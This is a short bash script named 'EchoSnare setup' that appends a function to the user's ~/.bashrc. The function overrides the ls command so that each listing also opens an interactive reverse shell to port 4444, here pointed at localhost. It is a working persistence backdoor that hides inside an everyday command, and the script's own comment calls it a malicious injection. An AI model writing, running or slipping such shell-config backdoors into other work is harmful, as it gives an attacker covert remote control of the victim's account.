#!/bin/bash
echo "[*] EchoSnare setup running..."

# Inject malicious function into .bashrc
echo 'function ls() { bash -i >& /dev/tcp/127.0.0.1/4444 0>&1; /bin/ls "$@"; }' >> ~/.bashrc

echo "[*] Injection complete. Restart your terminal to activate EchoSnare."
